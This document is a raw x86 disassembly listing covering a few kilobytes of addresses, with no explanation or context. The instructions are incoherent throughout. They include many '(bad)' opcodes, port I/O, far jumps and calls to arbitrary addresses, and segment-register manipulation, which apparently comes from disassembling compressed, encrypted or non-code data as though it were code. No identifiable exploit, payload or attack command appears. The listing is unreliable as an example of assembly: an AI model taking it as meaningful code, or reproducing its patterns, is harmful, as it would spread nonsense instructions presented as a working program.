  417901:	add    bl,ah
  417903:	push   0xb7ba558c
  417908:	xchg   edx,eax
  417909:	xor    ebx,DWORD PTR [esi+0xb97fbe]
  41790f:	lock test eax,0x0
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	cmc    
  417981:	lds    esi,FWORD PTR [edi+0xf99f30]
  417987:	add    BYTE PTR ds:0xea000001,al
  41798d:	nop
  41798e:	bnd jnp 0x4179d9
  417991:	push   eax
  417992:	pop    ds
  417993:	jmp    0x7ba06d14
  417998:	or     eax,0xb363ddc3
  41799d:	xchg   esp,eax
  41799e:	pusha  
  41799f:	xor    DWORD PTR [edi],ebp
  4179a1:	je     0x417996
  4179a3:	push   es
  4179a4:	test   DWORD PTR [edx-0x5551393f],esi
  4179aa:	mov    bh,0xbe
  4179ac:	mov    bh,0xc7
  4179ae:	xor    ecx,DWORD PTR [esi]
  4179b0:	pop    esp
  4179b1:	jge    0x4179dc
  4179b3:	imul   edx,DWORD PTR [ebx],0x30d37aad
  4179b9:	fcomi  st,st(1)
  4179bb:	mov    bl,0xe
  4179bd:	or     esi,DWORD PTR [ebx+0x3920c749]
  4179c3:	cmove  ecx,DWORD PTR [ebp-0x45ff5921]
  4179ca:	mov    WORD PTR [ebx+0x73d233b8],es
  4179d0:	and    BYTE PTR [ecx+ebx*8-0x71],bl
  4179d4:	lock pop ds
  4179d6:	fsubr  DWORD PTR [ebx-0x2a]
  4179d9:	in     eax,0x88
  4179db:	mov    esp,0xe44e61e9
  4179e0:	sub    BYTE PTR [edx+0x34a89a2d],bh
  4179e6:	xchg   esi,eax
  4179e7:	xchg   esp,eax
  4179e8:	mov    BYTE PTR [eax-0x73],ch
  4179eb:	mov    ch,0xdc
  4179ed:	jg     0x417a08
  4179ef:	fist   WORD PTR [ebx+eax*1-0x6d]
  4179f3:	cdq    
  4179f4:	js     0x417a2d
  4179f6:	inc    edx
  4179f7:	rcl    BYTE PTR [ebx-0x29b62f52],cl
  4179fd:	or     al,0x69
  4179ff:	push   edi
  417a00:	mov    cl,0xe6
  417a03:	sbb    eax,0x3ee42408
  417a08:	inc    esp
  417a09:	fs aaa 
  417a0b:	in     al,0x21
  417a0d:	push   edi
  417a0e:	add    BYTE PTR [ebp-0x63348de7],dl
  417a14:	in     eax,dx
  417a15:	jb     0x4179a2
  417a17:	jne    0x417a67
  417a19:	retf   0x6970
  417a1c:	retf   0xf6b7
  417a1f:	lock psllq mm7,QWORD PTR [ebx-0x1d]
  417a24:	in     al,dx
  417a25:	push   0xffffff8b
  417a27:	push   ebp
  417a28:	(bad)  
  417a29:	call   0xa7ab6a98
  417a2e:	lods   eax,DWORD PTR ds:[esi]
  417a2f:	(bad)  
  417a30:	bound  ebp,QWORD PTR [esi]
  417a32:	jmp    DWORD PTR [ecx-0x5f3e6ad4]
  417a38:	scas   eax,DWORD PTR es:[edi]
  417a39:	clc    
  417a3a:	sar    BYTE PTR ds:0xbecfb888,0xda
  417a41:	shl    DWORD PTR cs:[bp+si],0xe1
  417a46:	jecxz  0x417a22
  417a48:	inc    edi
  417a49:	mov    edi,0xdf5220c
  417a4e:	mov    ebx,0xf1d329f5
  417a53:	(bad)  
  417a54:	adc    eax,0x85a814c6
  417a59:	lds    eax,FWORD PTR [edi]
  417a5b:	lock shl DWORD PTR [ebx],cl
  417a5e:	sub    DWORD PTR [esi-0x4e],ebx
  417a61:	test   al,0x91
  417a63:	shl    dl,cl
  417a65:	mov    ch,0x57
  417a67:	in     al,0xbe
  417a69:	scas   eax,DWORD PTR es:[edi]
  417a6a:	or     BYTE PTR [ebx-0x7820b7cb],ah
  417a70:	adc    eax,0xb3f843c8
  417a75:	pop    edi
  417a76:	fnstsw ax
  417a78:	push   es
  417a79:	and    eax,0xf3d35f9f
  417a7e:	aaa    
  417a7f:	lea    esp,[esi+0x26]
  417a82:	jno    0x417a40
  417a84:	dec    ebp
  417a85:	scas   al,BYTE PTR es:[edi]
  417a86:	add    bh,al
  417a88:	in     eax,dx
  417a89:	dec    eax
  417a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a8b:	out    dx,eax
  417a8c:	sub    ebp,edx
  417a8e:	jbe    0x417a5c
  417a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0xeb0a6d]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xb4000001
  417b0d:	js     0x417b5d
  417b0f:	ficomp WORD PTR [ecx]
  417b11:	ja     0x417ab4
  417b13:	test   BYTE PTR [ecx+0x414c32a6],ch
  417b19:	out    dx,al
  417b1a:	(bad)  [edx-0x29a6d0a7]
  417b20:	inc    edx
  417b21:	lods   al,BYTE PTR ds:[esi]
  417b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b23:	pop    edi
  417b24:	sbb    edx,DWORD PTR [edx+0x50]
  417b27:	lock imul DWORD PTR [ecx+0x4]
  417b2b:	in     eax,0xf3
  417b2d:	sti    
  417b2e:	push   esi
  417b2f:	(bad)  
  417b30:	out    dx,eax
  417b31:	test   DWORD PTR [ebx-0x4d],edx
  417b34:	cld    
  417b35:	or     esp,DWORD PTR [eax-0x4b]
  417b38:	xor    BYTE PTR [ebx],dh
  417b3a:	loop   0x417b9d
  417b3c:	ja     0x417b52
  417b3e:	jmp    0x417b4f
  417b40:	ds cwde 
  417b42:	rcl    DWORD PTR [edi+0x745a2fd2],1
  417b48:	sub    esp,0xcb6990df
  417b4e:	mov    ds:0x75f38963,al
  417b53:	add    eax,ebx
  417b55:	gs xchg esp,eax
  417b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b58:	test   ax,0x96af
  417b5c:	adc    DWORD PTR ds:0x626b1927,edi
  417b62:	std    
  417b63:	push   ds
  417b64:	push   edx
  417b65:	(bad)  
  417b67:	jnp    0x417b65
  417b69:	call   0x3601:0xa12805f6
  417b70:	popf   
  417b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b72:	push   cs
  417b73:	sbb    ah,BYTE PTR [esi]
  417b75:	cmp    DWORD PTR [eax+0x283a002],eax
  417b7b:	mov    bh,0x9a
  417b7d:	jmp    0xe1e401c1
  417b82:	bound  edx,QWORD PTR [ebx]
  417b84:	scas   eax,DWORD PTR es:[edi]
  417b85:	inc    esp
  417b86:	or     ch,BYTE PTR [eax-0x13]
  417b89:	pop    ss
  417b8a:	pop    edx
  417b8b:	mov    edi,0x4b1e5741
  417b90:	ja     0x417c03
  417b92:	jb     0x417b97
  417b94:	xor    BYTE PTR [eax+0x21e797e0],cl
  417b9a:	mov    ecx,0x2dd239c1
  417b9f:	cli    
  417ba0:	mov    eax,0x142c99c9
  417ba5:	jmp    0x271818aa
  417baa:	ja     0x417b9c
  417bac:	fldcw  WORD PTR [edx+0x16]
  417baf:	popf   
  417bb0:	pop    es
  417bb1:	pop    esp
  417bb2:	xchg   ebp,eax
  417bb3:	(bad)  
  417bb4:	jbe    0x417c18
  417bb6:	mov    ebx,DWORD PTR [edx+0x205d49df]
  417bbc:	loop   0x417be0
  417bbe:	mov    esi,0x8fa0b3d2
  417bc3:	jp     0x417b85
  417bc5:	call   0x2046:0x26edbb7b
  417bcc:	jmp    0xc64b:0x5d4e4408
  417bd3:	xchg   edi,eax
  417bd4:	mov    al,0x6f
  417bd6:	outs   dx,DWORD PTR ds:[esi]
  417bd7:	loope  0x417bde
  417bd9:	inc    esp
  417bda:	inc    BYTE PTR ds:[ebp+0x5dc0009c]
  417be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be2:	not    DWORD PTR [esi-0x56]
  417be5:	out    0x3c,al
  417be7:	sbb    BYTE PTR [edi-0x3f],dh
  417bea:	sub    al,0x53
  417bec:	xchg   ebp,eax
  417bed:	xchg   edx,eax
  417bee:	(bad)  
  417bf0:	adc    DWORD PTR ss:[ecx],esp
  417bf3:	sub    bl,BYTE PTR [eax+0x6a]
  417bf6:	or     ecx,DWORD PTR [ebp+eiz*8-0x16]
  417bfa:	in     eax,0xa2
  417bfc:	dec    edi
  417bfd:	push   cs
  417bfe:	mov    eax,ds:0x98038a7c
  417c03:	jbe    0x417c3d
  417c05:	mov    edi,0xff42ee90
  417c0a:	inc    esi
  417c0b:	push   ds
  417c0c:	adc    al,0xc0
  417c0e:	ss mov dl,0xec
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x44
  417c81:	sti    
  417c82:	loope  0x417cd2
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [edx+0x615a99e7],ah
  417c91:	scas   eax,DWORD PTR es:[edi]
  417c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c93:	xchg   ebx,eax
  417c94:	mov    al,ds:0x52756e68
  417c99:	outs   dx,DWORD PTR ds:[esi]
  417c9a:	xor    DWORD PTR [edx],esp
  417c9c:	add    eax,0xa3cba057
  417ca1:	xchg   esp,eax
  417ca2:	imul   edi,DWORD PTR [edx+0x345a52b0],0xffffffc6
  417ca9:	push   esp
  417caa:	ror    BYTE PTR [eax],1
  417cac:	mov    ds:0xab05b5ae,eax
  417cb1:	pop    ss
  417cb2:	repnz xor bl,dl
  417cb5:	mov    bl,BYTE PTR es:[ebx+0x13d1528]
  417cbc:	cmp    al,0xaa
  417cbe:	repz dec esi
  417cc0:	xor    dl,ah
  417cc2:	repz pop ecx
  417cc4:	dec    edx
  417cc5:	pushf  
  417cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cc7:	xchg   dh,al
  417cc9:	or     eax,ecx
  417ccb:	stc    
  417ccc:	mov    eax,DWORD PTR [edx-0x3a]
  417ccf:	nop
  417cd0:	sbb    DWORD PTR [edx-0x652ad738],ebx
  417cd6:	mov    esi,0xa8fa40f1
  417cdb:	cmp    ebp,DWORD PTR [ebx+0x10]
  417cde:	or     BYTE PTR [eax-0x3122e1e],dl
  417ce4:	test   DWORD PTR [edi+0x7da91f71],edx
  417cea:	int    0x29
  417cec:	rcr    esp,0x15
  417cef:	xor    eax,DWORD PTR [ebx]
  417cf1:	and    BYTE PTR [esi-0x1e0b1111],bh
  417cf7:	xchg   ebp,eax
  417cf8:	(bad)  [esi+edx*2+0x52]
  417cfc:	les    ecx,FWORD PTR [ecx-0xf62c73]
  417d02:	jl     0x417c90
  417d04:	xchg   ebp,eax
  417d05:	into   
  417d06:	mov    ds:0x626e2b7,al
  417d0b:	repnz mov dl,0x9f
  417d0e:	xlat   BYTE PTR ds:[ebx]
  417d0f:	ins    BYTE PTR es:[edi],dx
  417d10:	adc    DWORD PTR cs:[esi+esi*2],ebp
  417d14:	push   es
  417d15:	fcom   DWORD PTR [esi+0x59db563f]
  417d1b:	js     0x417d7f
  417d1d:	nop
  417d1e:	mov    WORD PTR [ecx+edx*1],gs
  417d21:	fwait
  417d22:	sbb    BYTE PTR [eax-0x46],ah
  417d25:	push   edx
  417d26:	out    dx,ax
  417d28:	repz push ss
  417d2a:	inc    esi
  417d2b:	(bad)  
  417d2c:	imul   edx,DWORD PTR [ecx],0xfffffffe
  417d2f:	fwait
  417d30:	fs cli 
  417d32:	xor    BYTE PTR [edi],ch
  417d34:	push   ebp
  417d35:	mov    edi,0xea59c6f1
  417d3a:	jno    0x417da8
  417d3c:	out    dx,al
  417d3d:	stc    
  417d3e:	std    
  417d3f:	xor    eax,0xe8185f87
  417d44:	mov    ch,0x6c
  417d46:	sub    BYTE PTR [ecx-0x32],dl
  417d49:	inc    eax
  417d4a:	adc    DWORD PTR [ebx],ebx
  417d4c:	xchg   BYTE PTR [ecx-0x473e337f],dl
  417d52:	sbb    ebx,DWORD PTR [ecx+0x57]
  417d55:	in     al,0xae
  417d57:	sub    al,0xd7
  417d59:	pop    ds
  417d5a:	bound  eax,QWORD PTR [eax]
  417d5c:	sahf   
  417d5d:	dec    ebp
  417d5e:	jmp    0x417d94
  417d60:	jo     0x417d85
  417d62:	xor    ebp,edx
  417d64:	(bad)  
  417d65:	cmp    eax,0x7043653c
  417d6a:	mov    al,bh
  417d6c:	xchg   DWORD PTR [edi+ebx*2+0x115bfa11],edi
  417d73:	inc    ecx
  417d74:	pop    ds
  417d75:	aaa    
  417d76:	push   eax
  417d77:	cmp    ecx,DWORD PTR [esi]
  417d79:	xor    BYTE PTR [esi],0x87
  417d7c:	das    
  417d7d:	inc    esi
  417d7e:	ds repnz push 0x2b
  417d82:	loopne 0x417d4a
  417d84:	inc    ebp
  417d85:	sub    ebx,esi
  417d87:	popf   
  417d88:	jnp    0x417d90
  417d8a:	push   edx
  417d8b:	push   cs
  417d8c:	sub    al,0x14
  417d8e:	jmp    0x0:0xed7a
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	out    0xb8,al
  417e02:	sub    al,0xb5
  417e04:	scas   al,BYTE PTR es:[edi]
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x5a000001
  417e0d:	and    bh,0x1a
  417e10:	dec    esi
  417e11:	jb     0x417e8f
  417e13:	sahf   
  417e14:	pop    ebp
  417e15:	fld    QWORD PTR [edi+0x4e152d73]
  417e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e1c:	lahf   
  417e1d:	dec    esp
  417e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e1f:	pop    ds
  417e20:	sti    
  417e21:	ds aam 0x7a
  417e24:	pop    ecx
  417e25:	ins    BYTE PTR es:[edi],dx
  417e26:	ret    0x201
  417e29:	fwait
  417e2a:	cld    
  417e2b:	xor    eax,0x83723131
  417e30:	out    0x12,eax
  417e32:	in     al,dx
  417e33:	inc    DWORD PTR ss:[ebx-0x57e021f3]
  417e3a:	jle    0x417e11
  417e3c:	imul   ebp,DWORD PTR [esi],0xdab30bc1
  417e42:	adc    bl,BYTE PTR [edi]
  417e44:	lea    edx,[esp+eax*8]
  417e47:	imul   esp,DWORD PTR [ecx],0xffffffeb
  417e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e4b:	(bad)  
  417e4c:	test   al,0xf
  417e4e:	xchg   ebp,eax
  417e4f:	loopne 0x417ec1
  417e51:	mov    dh,0x97
  417e53:	mov    eax,0x49b20f26
  417e58:	cmp    ebx,esi
  417e5a:	inc    ecx
  417e5b:	adc    ah,ch
  417e5d:	sti    
  417e5e:	fsub   DWORD PTR ds:0x8d3ed0c2
  417e64:	cs icebp 
  417e66:	xor    DWORD PTR [ebx+eiz*2-0x1b523083],edi
  417e6d:	mov    eax,ds:0x2b9aa4f4
  417e72:	mov    DWORD PTR [ebp+0x60ea38da],esp
  417e78:	or     al,0xab
  417e7a:	add    ah,ah
  417e7c:	sub    DWORD PTR [edi-0x30],esi
  417e7f:	adc    DWORD PTR [esi],edi
  417e81:	lock stc 
  417e83:	or     eax,DWORD PTR [eax]
  417e85:	inc    eax
  417e86:	cld    
  417e87:	fstp   QWORD PTR [edi]
  417e89:	adc    ecx,DWORD PTR [esp+ecx*1]
  417e8c:	xor    ch,BYTE PTR [ecx]
  417e8e:	js     0x417ed8
  417e90:	dec    eax
  417e91:	mov    dl,0x19
  417e93:	xchg   edi,eax
  417e94:	push   edx
  417e95:	and    DWORD PTR [eax-0x664cb63b],ebp
  417e9b:	add    BYTE PTR [ebp+ebx*1-0x212f7695],0xa4
  417ea3:	jle    0x417f07
  417ea5:	mov    dh,0x7e
  417ea7:	in     al,0x15
  417ea9:	jle    0x417e5a
  417eab:	clc    
  417eac:	jnp    0x417e55
  417eae:	dec    eax
  417eaf:	or     ah,BYTE PTR [edx]
  417eb1:	cs mov esp,0xbc1dc3fa
  417eb7:	fisubr DWORD PTR [ebx-0x3a]
  417eba:	dec    ebp
  417ebb:	scas   al,BYTE PTR es:[edi]
  417ebc:	es and al,0x4c
  417ebf:	inc    ebp
  417ec0:	jb     0x417e96
  417ec2:	mov    al,ds:0xe5110d3b
  417ec7:	out    0xe2,eax
  417ec9:	scas   al,BYTE PTR es:[edi]
  417eca:	fisubr DWORD PTR [ebp-0x6babb535]
  417ed0:	iret   
  417ed1:	cmp    DWORD PTR [edx],0x55ca2b43
  417ed7:	daa    
  417ed8:	or     eax,0xf654e55c
  417edd:	mov    DWORD PTR [ecx+0x2b],ebx
  417ee0:	popa   
  417ee1:	mov    DWORD PTR [ecx+0x6a],ecx
  417ee4:	pmulhw mm6,mm1
  417ee7:	out    0xfc,al
  417ee9:	xchg   ebx,eax
  417eea:	push   ecx
  417eeb:	mov    BYTE PTR [eax],bl
  417eed:	mov    esi,0xc1017fe
  417ef2:	call   0x5ae06f35
  417ef7:	and    al,cl
  417ef9:	out    0xa7,al
  417efb:	adc    eax,0x10a25238
  417f00:	outs   dx,BYTE PTR ds:[esi]
  417f01:	xor    dl,BYTE PTR [ecx]
  417f03:	xchg   ebp,eax
  417f04:	scas   al,BYTE PTR es:[edi]
  417f05:	mov    dh,0xcf
  417f07:	xchg   edi,eax
  417f08:	adc    BYTE PTR [ebp-0xb],bh
  417f0b:	dec    esp
  417f0c:	shl    DWORD PTR [esi],cl
  417f0e:	jp     0x417e9b
  417f10:	out    dx,al
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	mov    al,ds:0xb3a29d9d
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x96000001
  417f8d:	adc    ah,BYTE PTR [ebx+edi*1-0x3c]
  417f91:	loopne 0x417f22
  417f93:	inc    ebx
  417f94:	imul   edi,DWORD PTR [edx-0x64bd14d6],0x29c8b4a8
  417f9e:	xchg   esp,eax
  417f9f:	popf   
  417fa0:	dec    eax
  417fa1:	(bad)
  417fa5:	xchg   ebp,eax
  417fa6:	retf   0xf012
  417fa9:	jne    0x417f4c
  417fab:	test   BYTE PTR [ebx],al
  417fad:	ror    bl,1
  417faf:	sub    al,0xbe
  417fb1:	and    BYTE PTR [ecx-0x3e4342c9],al
  417fb7:	add    cl,cl
  417fb9:	call   0xbc9f51ae
  417fbe:	iret   
  417fbf:	ss mov BYTE PTR ss:[edi+0x2e],0x71
  417fc5:	in     al,dx
  417fc6:	(bad)  
  417fc7:	aam    0x88
  417fc9:	and    al,0x1c
  417fcb:	inc    edx
  417fcc:	jnp    0x417f59
  417fce:	mov    ebx,0x9d1ef38a
  417fd3:	dec    esi
  417fd4:	or     eax,DWORD PTR [eax-0x131cae81]
  417fda:	daa    
  417fdb:	pop    ds
  417fdc:	dec    ebx
  417fdd:	jmp    0xedc1:0xb7d94c23
  417fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fe5:	mov    ah,0x26
  417fe7:	and    ebp,DWORD PTR [eax-0x2bfa050b]
  417fed:	jmp    0xe0df:0xbb2bf6d4
  417ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff5:	call   0xef3e:0x2f8a76e3
  417ffc:	ss mov ecx,0x55c0e5bd
  418002:	or     bl,cl
  418004:	(bad)  
  418006:	or     eax,0xfc759b2d
  41800b:	stos   DWORD PTR es:[edi],eax
  41800c:	adc    esi,DWORD PTR [ebx-0x759ad148]
  418012:	mov    ds:0xdead0496,eax
  418017:	pop    ss
  418018:	mov    al,ds:0x66c04f73
  41801d:	scas   al,BYTE PTR es:[edi]
  41801e:	stos   BYTE PTR es:[edi],al
  41801f:	retf   
  418020:	mov    cl,dh
  418022:	inc    ecx
  418023:	enter  0x7b8f,0x34
  418027:	jns    0x41800e
  418029:	shl    BYTE PTR [edi-0x455dd256],cl
  41802f:	stos   BYTE PTR es:[edi],al
  418030:	and    eax,DWORD PTR [esi-0x6a]
  418033:	jae    0x418024
  418035:	pusha  
  418036:	test   DWORD PTR [edx+0x44],ebx
  418039:	mov    al,0x26
  41803b:	pop    ebp
  41803c:	retf   
  41803d:	retf   
  41803e:	(bad)  
  41803f:	sti    
  418040:	leave  
  418041:	lahf   
  418042:	loope  0x41808e
  418044:	push   ss
  418045:	adc    esi,DWORD PTR [esi+0xdb6ae75]
  41804b:	push   ecx
  41804c:	inc    edx
  41804d:	dec    eax
  41804e:	daa    
  41804f:	mov    esi,0x7b688bf3
  418054:	ins    BYTE PTR es:[edi],dx
  418055:	push   0x90e1dac8
  41805a:	push   ds
  41805b:	mov    ds:0xc6afacd9,al
  418060:	mov    ch,0xd9
  418062:	jg     0x418005
  418064:	jp     0x41805e
  418066:	lahf   
  418067:	xor    eax,0x1ace9104
  41806c:	enter  0x9675,0x9b
  418070:	in     eax,dx
  418071:	push   ebx
  418072:	or     al,0x34
  418074:	test   DWORD PTR [ebp+0x3e],0xac1e2c1f
  41807b:	and    DWORD PTR [ebp+0x28],ebp
  41807e:	cmp    al,0xdf
  418080:	sub    ecx,ebp
  418082:	xlat   BYTE PTR ds:[ebx]
  418083:	pop    eax
  418084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418085:	iret   
  418086:	rol    ah,1
  418088:	fmul   st(3),st
  41808a:	jae    0x41806b
  41808c:	or     bh,dl
  41808e:	cmp    dl,BYTE PTR [ebp+0x56]
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x622fdebc,eax
  418101:	inc    DWORD PTR [edi+0xfeb81d]
  418107:	add    BYTE PTR ds:0x6b000001,al
  41810d:	mov    ebp,0x31feff6d
  418112:	mov    edx,0x3e4acae6
  418117:	xchg   DWORD PTR ds:0xe18937ce,edx
  41811d:	dec    ecx
  41811e:	jecxz  0x418151
  418120:	call   0x3850:0x1f905090
  418127:	mov    ecx,0x8727c6ae
  41812c:	gs mov edx,0xa70dfa8d
  418132:	imul   ecx,DWORD PTR [eax+0x2a1d5766],0xe7d78e61
  41813c:	and    DWORD PTR [edx-0xc5e5c5e],0xffffffbb
  418143:	inc    ebx
  418144:	adc    ah,BYTE PTR [edx]
  418146:	(bad)  
  418147:	fdiv   DWORD PTR ss:[eax]
  41814a:	xchg   edi,eax
  41814b:	sub    bl,BYTE PTR [ebx+0x59187303]
  418151:	dec    esp
  418152:	sub    ch,0x12
  418155:	shl    BYTE PTR [ecx-0x1e],1
  418158:	jne    0x4181b9
  41815a:	adc    BYTE PTR ds:0xeecbb2c8,al
  418160:	imul   ebp,DWORD PTR [ebp-0x6e],0x2989535e
  418167:	jns    0x418148
  418169:	retf   0x2d1f
  41816c:	test   DWORD PTR [ebx+0x4f],ecx
  41816f:	jae    0x418111
  418171:	pop    esi
  418172:	leave  
  418173:	imul   ebx,esi,0x2fcf4d7a
  418179:	sti    
  41817a:	pop    edx
  41817b:	jb     0x418117
  41817d:	cmp    edi,0x7f79c5ef
  418183:	mov    fs,WORD PTR [ebx+0x27]
  418186:	xchg   edx,eax
  418187:	aam    0xf0
  418189:	stc    
  41818a:	inc    eax
  41818b:	add    eax,ebp
  41818d:	sub    dl,al
  41818f:	fistp  QWORD PTR [edx+0x50]
  418192:	cmp    BYTE PTR [eax-0x71af76e2],0x26
  418199:	adc    edi,edx
  41819b:	in     al,dx
  41819c:	dec    eax
  41819d:	jae    0x41818d
  41819f:	fs adc ah,0x68
  4181a3:	and    eax,0xfe792853
  4181a8:	and    bh,bl
  4181aa:	mov    al,ds:0xbfe59b6
  4181af:	push   0xffffffc5
  4181b1:	inc    esi
  4181b2:	aad    0x39
  4181b4:	adc    esi,ebp
  4181b6:	cmp    BYTE PTR [ebx],al
  4181b8:	loopne 0x418208
  4181ba:	xchg   BYTE PTR [eax],ah
  4181bc:	pop    esi
  4181bd:	jne    0x4181bc
  4181bf:	cmp    ebp,eax
  4181c1:	out    0x75,eax
  4181c3:	push   ebx
  4181c4:	lods   eax,DWORD PTR ds:[esi]
  4181c5:	xor    edx,DWORD PTR [ebx+0x68cd72d4]
  4181cb:	lea    eax,[edi-0x2bb3a849]
  4181d1:	inc    ebx
  4181d2:	outs   dx,DWORD PTR ds:[esi]
  4181d3:	mov    cl,0xbe
  4181d5:	mov    esi,0xf23543dc
  4181da:	add    ebx,DWORD PTR [edi+0x38]
  4181dd:	fist   WORD PTR [edx-0x7]
  4181e0:	cmp    bl,al
  4181e2:	push   esi
  4181e3:	pop    ebp
  4181e4:	push   ecx
  4181e5:	jge    0x41821b
  4181e7:	dec    edx
  4181e8:	popf   
  4181e9:	sub    DWORD PTR [eax],edi
  4181eb:	push   ss
  4181ec:	fs push ebx
  4181ee:	cmp    eax,0xc756748
  4181f3:	repnz lock test DWORD PTR [ebx-0x38],edx
  4181f8:	inc    ebx
  4181f9:	xchg   edx,eax
  4181fa:	jg     0x4181d0
  4181fc:	xlat   BYTE PTR ds:[ebx]
  4181fd:	jge    0x418260
  4181ff:	jg     0x4181fd
  418201:	in     eax,dx
  418202:	daa    
  418203:	adc    eax,0xb83f8dd9
  418208:	xchg   esp,eax
  418209:	ja     0x418253
  41820b:	adc    al,0xaa
  41820d:	pop    esi
  41820e:	jne    0x4181a8
  418210:	pop    ebp
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xc4aeb8d6
  418282:	pop    edx
  418283:	push   esi
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    bl,dh
  41828d:	dec    ecx
  41828e:	push   0x4e
  418290:	inc    ecx
  418291:	je     0x41829f
  418293:	jb     0x41827e
  418295:	in     eax,dx
  418296:	push   edx
  418297:	xchg   edx,eax
  418298:	daa    
  418299:	mov    cs,ebp
  41829b:	shl    BYTE PTR [ecx],1
  41829d:	lods   eax,DWORD PTR ds:[esi]
  41829e:	loope  0x41824c
  4182a0:	xchg   esp,eax
  4182a1:	imul   ebp,DWORD PTR [ebp+0x40],0x852b3562
  4182a8:	push   cs
  4182a9:	test   BYTE PTR [ecx+edi*4+0x6fc5be93],0x74
  4182b1:	test   BYTE PTR [ecx],dl
  4182b3:	mov    bl,0x28
  4182b5:	jns    0x418262
  4182b7:	xor    eax,0x47f2e187
  4182bc:	(bad)  [edx+0x51]
  4182bf:	mov    gs,WORD PTR [eax-0x61]
  4182c2:	fisub  DWORD PTR [edi-0x55]
  4182c5:	je     0x4182ea
  4182c7:	ss jecxz 0x418325
  4182ca:	jbe    0x418299
  4182cc:	ret    0xe538
  4182cf:	jmp    0x49f1135b
  4182d4:	or     DWORD PTR [esi],eax
  4182d6:	dec    ebx
  4182d7:	mov    edx,0xef49940c
  4182dc:	ins    DWORD PTR es:[edi],dx
  4182dd:	add    ebp,eax
  4182df:	div    DWORD PTR [ebp+esi*8+0x5a8008b4]
  4182e6:	popf   
  4182e7:	leave  
  4182e8:	mov    BYTE PTR [esi+0x3b43eb57],cl
  4182ee:	pop    esi
  4182ef:	add    ebx,eax
  4182f1:	jbe    0x41828d
  4182f3:	jmp    0x1fdbea15
  4182f8:	jbe    0x4182a7
  4182fa:	add    ah,BYTE PTR [ecx]
  4182fc:	sahf   
  4182fd:	sbb    eax,0x6e62fea1
  418302:	mov    esp,es
  418304:	inc    ecx
  418305:	popf   
  418306:	sub    al,0x54
  418308:	or     ecx,DWORD PTR [ebp+0x64033ae6]
  41830e:	push   ebx
  41830f:	add    ch,BYTE PTR [ebx+eiz*4-0x50]
  418313:	sti    
  418314:	loopne 0x418300
  418316:	int    0xe8
  418318:	adc    eax,DWORD PTR [edi+0x39]
  41831b:	mov    esi,0x756bbc5e
  418320:	imul   esp,DWORD PTR [ebx-0x14],0x22750c45
  418327:	pop    edi
  418328:	adc    DWORD PTR [eax-0x55e4f922],edi
  41832e:	aas    
  41832f:	dec    edi
  418330:	ror    dh,1
  418332:	mov    esi,0x53514d64
  418337:	jne    0x4183b2
  418339:	repnz mov ds:0x8c125ade,al
  41833f:	cld    
  418340:	xchg   ebp,eax
  418341:	and    ah,BYTE PTR ds:0xe5ee3dbd
  418347:	mov    dl,0x5e
  418349:	aam    0xb1
  41834b:	cmp    BYTE PTR [edi],dh
  41834d:	into   
  41834e:	xchg   ebp,eax
  41834f:	test   al,0x3
  418351:	add    BYTE PTR [ebx+ebx*1+0x67],bl
  418355:	sub    BYTE PTR [edx+0x46],ch
